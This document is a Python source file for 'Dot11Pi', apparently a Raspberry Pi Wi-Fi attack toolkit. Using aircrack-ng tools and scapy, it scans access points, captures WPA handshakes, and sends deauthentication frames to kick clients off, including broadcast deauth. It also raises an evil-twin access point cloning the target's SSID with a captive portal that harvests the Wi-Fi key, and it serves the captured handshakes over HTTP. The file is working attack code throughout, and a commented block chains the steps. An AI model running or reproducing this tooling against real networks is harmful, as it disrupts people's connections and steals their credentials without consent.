from classes import AccessPoint
from typing import Literal, List, Dict, Union
import os
import sys
import logging
from signal import SIGINT
from subprocess import Popen, PIPE, run, DEVNULL
from threading import Thread, Event
from queue import Queue
from time import sleep
from scapy.sendrecv import AsyncSniffer
from scapy.layers import dot11
from scapy.packet import Packet
import random
import string


class Dot11Pi:

    services: List[str]
    threads: Dict[str, Union[Thread, AsyncSniffer, Popen, None]]
    events: Dict[str, Event]

    def __init__(self, logging_level=logging.INFO):
        self.services = self._find_services()
        self.threads = {"hop": None, "ap_scan": None, "sniff": None, "sniff_clients": None, "deauth": None, "hostapd": None, "dnsmasq": None, "flask": None, "httpserver": None}
        self.events = {"ap_scan": Event(), "sniff": Event(), "hash_found": Event(), "sniff_clients": Event(), "deauth": Event(), "captive_portal": Event(), "key_found": Event(), "hash_sharing": Event()}
        logging.basicConfig(level=logging_level, format='%(asctime)s - %(levelname)s - %(message)s')
        logging.info("Dot11Pi initialized")

        for directory in ["../tmp", "../hashes", "../logins", "../configs"]:
            os.makedirs(os.path.join(os.path.dirname(__file__), directory), exist_ok=True)

    def _find_services(self) -> List[str]:
        output = run("airmon-ng check", shell=True, stdout=PIPE).stdout.decode().split("\n")
        services = ["networking", "wpa_supplicant"]
        pid_found = False
        for line in output:
            if "PID" in line:
                pid_found = True
                continue
            if not pid_found or line.strip() == "":
                continue
            service = line.split()[1]
            if service not in services:
                services.append(service)
                if service == "NetworkManager":
                    services.remove("networking")
        logging.debug(f"Services found: {services}")
        return services

    def manage_services(self, option: Literal["start", "stop"]):
        for service in self.services:
            run(f"systemctl {option} {service}", shell=True)
            logging.info(f"{'Stopped' if option == 'stop' else 'Started'} {service}")

    def list_interfaces(self) -> List[str]:
        interfaces = []
        output = run("iw dev", shell=True, stdout=PIPE).stdout.decode().split("\n")
        for line in output:
            if "Interface" in line:
                interfaces.append(line.split()[1])
        logging.debug(f"Interfaces found: {interfaces}")
        return interfaces
    
    def check_interface_mode(self, iface: str) -> Union[Literal["monitor", "managed"], str]:
        mode = run(f"iw dev {iface} info", shell=True, stdout=PIPE).stdout.decode()
        if "type monitor" in mode:
            return "monitor"
        elif "type managed" in mode:
            return "managed"
        else:
            mode = mode.split()
            return mode[mode.index("type")+1]
        
    def iface_set_mode(self, iface: str, mode: Literal["monitor", "managed"]):
        run(f"sudo ip link set {iface} down", shell=True)
        run(f"sudo iw dev {iface} set type {mode}", shell=True)
        run(f"sudo ip link set {iface} up", shell=True)
        logging.info(f"Switched {iface} to {mode} mode")

    def scan_ap(self, iface: str) -> Queue[AccessPoint]:
        aps: Queue[AccessPoint] = Queue()
        aps_found: List[AccessPoint] = []
        self.events["ap_scan"].clear()
        logging.info(f"Starting AP scan on interface {iface}")

        def hop_channels(iface: str):
            channel = 1
            while not self.events["ap_scan"].is_set():
                run(f"iw {iface} set channel {channel}", shell=True)
                channel = ((channel + 1) % 14) + 1
                sleep(0.25)

        def packet_handler(pkt: Packet, aps: Queue[AccessPoint], aps_found: List[AccessPoint]):
            if pkt.haslayer(dot11.Dot11):
                pkt: dot11.Dot11
                if pkt.type == 0 and pkt.subtype == 8:
                    ssid = pkt.info.decode()
                    bssid = pkt.addr2
                    channel = int.from_bytes(pkt[dot11.Dot11Elt:3].info, byteorder='big')
                    ap = AccessPoint(ssid, bssid, channel)
                    if bssid and ssid and ap not in aps_found:
                        aps.put(ap)
                        aps_found.append(ap)
                        logging.debug(f"AP found: {ap}")

        self.threads["hop"] = Thread(target=hop_channels, args=(iface,))
        self.threads["ap_scan"] = AsyncSniffer(iface=iface, prn=lambda pkt: packet_handler(pkt, aps, aps_found))
        self.threads["hop"].start()
        self.threads["ap_scan"].start()
        return aps

    def stop_scan_ap(self):
        self.events["ap_scan"].set()
        logging.info("Stopping AP scan")
        if self.threads["hop"].is_alive():
            self.threads["hop"].join()
        self.threads["ap_scan"].stop(join=True)
        logging.info("AP scan stopped")

    def start_sniffing(self, iface: str, ap: AccessPoint):
        logging.info(f"Starting sniffing on interface {iface} for AP {ap}")
        self.events["hash_found"].clear()
        self.events["sniff"].clear()
        channel = ap.channel
        bssid = ap.bssid
        ssid = ap.ssid.replace(" ", "_")

        def sniff_handshake(iface:str, channel: int, bssid: str, ssid: str):
            old_files = os.listdir(os.path.join(os.path.dirname(__file__), "../tmp"))
            command = f"airodump-ng -c {channel} --bssid {bssid} -w {ssid} --output-format pcap --update 1 {iface}"
            logging.debug(f"Sniffing command: {command}")
            process = Popen(command.split(), cwd=os.path.join(os.path.dirname(__file__), "../tmp"), stdout=PIPE, stdin=DEVNULL, stderr=PIPE)
            try:
                while not self.events["sniff"].is_set():
                    output = process.stdout.readline().decode(errors="ignore").strip()
                    if "WPA handshake:" in output:
                        logging.info("Handshake packet captured")
                        self.events["hash_found"].set()
                        self.events["sniff"].set()
            finally:
                logging.info("Stopping sniffing")
                process.send_signal(SIGINT)
                process.wait()
                files = os.listdir(os.path.join(os.path.dirname(__file__), "../tmp"))
                new_file = os.path.join(os.path.dirname(__file__), "../tmp", next(file for file in files if file not in old_files and file.endswith(".cap") and ssid in file))
                if self.events["hash_found"].is_set():
                    os.rename(new_file, os.path.join(os.path.dirname(__file__), "../hashes", ssid.replace(" ","_")+".pcap"))
                else:
                    os.remove(new_file)
                logging.info("Sniffing stopped")

        self.threads["sniff"] = Thread(target=sniff_handshake, args=(iface, channel, bssid, ssid))
        self.threads["sniff"].start()

    def stop_sniffing(self):
        self.events["sniff"].set()
        logging.info("Stopping sniffing")
        if self.threads["sniff"].is_alive():
            self.threads["sniff"].join()
        logging.info("Sniffing stopped")

    def sniff_clients(self, iface: str, ap: AccessPoint) -> Queue:
        clients: Queue[str] = Queue()
        clients_found: List[str] = []
        self.events["sniff_clients"].clear()
        logging.info(f"Started sniffing clients on interface {iface} for AP {ap}")

        def packet_handler(pkt: Packet, clients: Queue[str], ap: AccessPoint, clients_found: List[str]):
            if pkt.haslayer(dot11.Dot11):
                pkt: dot11.Dot11
                if pkt.type == 2:
                    bssid = pkt.addr1
                    client = pkt.addr2
                    if bssid == ap.bssid and client not in clients_found:
                        clients.put(client)
                        clients_found.append(client)
                        logging.debug(f"Client found: {client}")

        self.threads["sniff_clients"] = AsyncSniffer(iface=iface, prn=lambda pkt: packet_handler(pkt, clients, ap, clients_found))
        self.threads["sniff_clients"].start()
        return clients

    def stop_sniffing_clients(self):
        self.events["sniff_clients"].set()
        logging.info("Stopping client sniffing")
        self.threads["sniff_clients"].stop(join=True)
        logging.info("Client sniffing stopped")

    def deauth(self, client: str, ap: AccessPoint, iface: str):
        logging.info(f"Starting deauth on interface {iface} for client {client} on AP {ap}")
        self.events["deauth"].clear()

        def _deauth(client: str, ap: AccessPoint, iface: str):
            if client.lower() == "ff:ff:ff:ff:ff:ff":
                command = f"aireplay-ng -0 5 -a {ap.bssid} {iface}"
            else:
                command = f"aireplay-ng -0 5 -a {ap.bssid} -c {client} {iface}"
            logging.debug(f"Deauth command: {command}")
            process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
            process.wait()
            self.events["deauth"].set()
            logging.info("Deauth completed")

        self.threads["deauth"] = Thread(target=_deauth, args=(client, ap, iface))
        self.threads["deauth"].start()

    def _configure_captive_portal(self, iface: str, ssid: str, channel: int):
        logging.info(f"Configuring captive portal on interface {iface} with SSID {ssid} and channel {channel}")
        run(f"ifconfig {iface} down", shell=True)
        run(f"ifconfig {iface} up 192.168.1.1/24", shell=True)

        hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0"""
        
        dnsmasq_conf = f"""interface={iface}
dhcp-range=192.168.1.10,192.168.1.250,255.255.255.0,24h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-dhcp
log-queries
address=/#/192.168.1.1"""
        
        with open(os.path.join(os.path.dirname(__file__), "../configs/hostapd.conf"), "w") as f:
            f.write(hostapd_conf)
        with open(os.path.join(os.path.dirname(__file__), "../configs/dnsmasq.conf"), "w") as f:
            f.write(dnsmasq_conf)
        logging.info("Captive portal configuration completed")

    def start_captive_portal(self, iface: str, ap: AccessPoint) -> Queue[str]:
        if not self.check_interface_mode(iface) == "managed":
            raise Exception(f"{iface} needs to be in managed mode")
        
        self.events["key_found"].clear()
        flask_output: Queue[str] = Queue()
        logging.info(f"Starting captive portal on interface {iface} for AP {ap}")

        ssid = ap.ssid
        channel = ap.channel

        self._configure_captive_portal(iface, ssid, channel)
        hostapd_command = f"hostapd {os.path.join(os.path.dirname(__file__), '../configs/hostapd.conf')} -i {iface}"
        dnsmasq_command = f"dnsmasq -d -C {os.path.join(os.path.dirname(__file__), '../configs/dnsmasq.conf')} -i {iface}"

        self.events["captive_portal"].clear()
        self.threads["hostapd"] = Popen(hostapd_command.split(), stdout=PIPE, stderr=PIPE)
        self.threads["dnsmasq"] = Popen(dnsmasq_command.split(), stdout=PIPE, stderr=PIPE)
        
        def flask(ssid: str, flask_output: Queue[str]):
            flask_command = f"python3 {os.path.join(os.path.dirname(__file__), 'captiveportal.py')} " + ssid
            process = Popen(flask_command.split(), stdout=PIPE, stderr=PIPE)
            try:
                while not self.events["captive_portal"].is_set():
                    output = process.stderr.readline().decode().strip()
                    if output:
                        flask_output.put(output)
                        logging.debug(f"Flask output: {output}")
                        if "KEY FOUND" in output:
                            logging.info(f"{ssid} key found")
                            self.events["key_found"].set()
            finally:
                logging.info("Stopping flask")
                process.send_signal(SIGINT)
                process.wait()
                logging.info("Flask stopped")

        self.threads["flask"] = Thread(target=flask, args=(ssid, flask_output))
        self.threads["flask"].start()
        return flask_output

    def stop_captive_portal(self):
        self.events["captive_portal"].set()
        logging.info("Stopping captive portal")
        self.threads["hostapd"].send_signal(SIGINT)
        self.threads["hostapd"].wait()
        self.threads["dnsmasq"].send_signal(SIGINT)
        self.threads["dnsmasq"].wait()
        if self.threads["flask"].is_alive():
            logging.info("Waiting for Flask thread to join")
            self.threads["flask"].join()
        logging.info("Captive portal stopped")

    def get_logins(self) -> Dict[str, str]:
        logins = os.listdir(os.path.join(os.path.dirname(__file__), "../logins"))
        logins.remove(".gitkeep")
        logins_dict = {}
        for login in logins:
            with open(os.path.join(os.path.dirname(__file__), "../logins", login), "r") as f:
                logins_dict[login] = f.read()
        logging.debug(f"Logins found: {logins_dict}")
        return logins_dict

    def start_sharing_hashes(self, iface: str) -> str:
        if not self.check_interface_mode(iface) == "managed":
            raise Exception(f"{iface} needs to be in managed mode")
        
        logging.info(f"Starting sharing hashes on interface {iface}")
        self._configure_captive_portal(iface, "Dot11Pi", 1)

        password = ''.join(random.choice(string.ascii_letters) for i in range(8))

        with open(os.path.join(os.path.dirname(__file__), "../configs/hostapd.conf"), "a") as f:
            f.write(f"\nwpa=2\nwpa_passphrase={password}\n")
        logging.info(f"Generated WPA passphrase: {password}")

        hostapd_command = f"hostapd {os.path.join(os.path.dirname(__file__), '../configs/hostapd.conf')} -i {iface}"
        dnsmasq_command = f"dnsmasq -d -C {os.path.join(os.path.dirname(__file__), '../configs/dnsmasq.conf')} -i {iface}"
        httpserver_command = f"python3 -m http.server 80"

        self.events["hash_sharing"].clear()
        self.threads["hostapd"] = Popen(hostapd_command.split(), stdout=PIPE, stderr=PIPE)
        self.threads["dnsmasq"] = Popen(dnsmasq_command.split(), stdout=PIPE, stderr=PIPE)
        self.threads["httpserver"] = Popen(httpserver_command.split(), stdout=PIPE, stderr=PIPE, cwd=os.path.join(os.path.dirname(__file__), "../hashes"))
        logging.info("Hash sharing started")

        return password

    def stop_sharing_hashes(self):
        self.events["hash_sharing"].set()
        logging.info("Stopping hash sharing")
        self.threads["hostapd"].send_signal(SIGINT)
        self.threads["hostapd"].wait()
        self.threads["dnsmasq"].send_signal(SIGINT)
        self.threads["dnsmasq"].wait()
        self.threads["httpserver"].send_signal(SIGINT)
        self.threads["httpserver"].wait()
        logging.info("Hash sharing stopped")

def elevate_to_root():
    if os.geteuid() != 0:
        logging.info("Elevating to root")
        args = ['sudo', sys.executable] + sys.argv
        os.execvp('sudo', args)

if __name__ == "__main__":
    elevate_to_root()
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

    # ap = AccessPoint("WIFI", 13)
    # app = Dot11Pi()
    # app.manage_services("stop")
    # app.iface_set_mode("wlan0", "monitor")
    # sleep(1)
    # app.start_sniffing("wlan0", ap)
    # sleep(1)
    # clients = app.sniff_clients("wlan0", ap)
    # client = clients.get()
    # app.deauth(client, ap, "wlan0")
    # sleep(1)
    # app.deauth("ff:ff:ff:ff:ff:ff", ap, "wlan0")
    # sleep(1)
    # app.events["hash_found"].wait()
    # sleep(1)
    # app.stop_sniffing()
    # sleep(1)
    # app.stop_sniffing_clients()
    # sleep(1)
    # app.iface_set_mode("wlan0", "managed")
    # sleep(1)
    # app.start_captive_portal("wlan0",ap)
    # app.events["captive_portal"].wait()
    # app.stop_captive_portal()
    # sleep(1)
    # app.manage_services("start")